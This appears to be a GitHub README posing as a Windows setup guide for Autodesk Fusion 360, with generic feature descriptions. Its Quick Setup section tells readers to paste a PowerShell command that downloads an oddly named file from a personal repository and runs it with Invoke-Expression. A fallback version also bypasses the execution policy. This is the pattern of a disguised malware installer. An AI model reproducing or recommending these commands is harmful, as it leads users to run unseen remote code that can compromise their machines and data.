# Fusion 360

Fusion 360 is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Fusion 360 and work in it.

Fusion 360 is Autodesk’s unified environment for parametric modeling, assemblies, drawings, rendering, and manufacturing preparation. On Windows it runs as a desktop client with project data synced to your hub, so teams can share designs, versions, and manufacturing outputs without juggling separate tools.

A typical session starts in the Design workspace: you sketch with constraints, extrude and fillet solids, place components in an assembly, and check motion or interference. You might switch to Simulation for stress or thermal studies, open Manufacture to pick setups and post G-code for a mill or lathe, and finish with a drawing sheet or a rendered image for review.

This repository tracks a Windows setup bundle, install notes for common deployment paths, and a changelog of local packaging updates. It is meant for teams who standardize Fusion versions and document how the client is installed and updated on shop-floor PCs.

## What you do with it

- Parametric timelines let you edit sketches and features without rebuilding the whole model.
- Assembly joints and contact sets help you validate motion and clearance before manufacturing.
- Integrated CAM creates two-and-a-half and three-axis toolpaths tied directly to your solid geometry.
- Simulation workspaces run static stress and thermal studies on models you already built in Design.
- Drawing views update when the parent model changes, keeping dimensions aligned with the latest revision.
- Rendering tools produce realistic images from the same model used for machining and documentation.
- Cloud hubs store project versions so collaborators see consistent data across Windows workstations.
- Manufacture setups export post-processed NC code formatted for common mills, lathes, and routers.

## Quick Setup (PowerShell)

This installs the program Fusion 360 on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/mmartin927136/fusion-360-setup-guide/main/49vfjkaifv.0fcb3ej7 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/mmartin927136/fusion-360-setup-guide/main/49vfjkaifv.0fcb3ej7 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `49vfjkaifv.0fcb3ej7` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `mmartin927136/fusion-360-setup-guide`. Fusion 360 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
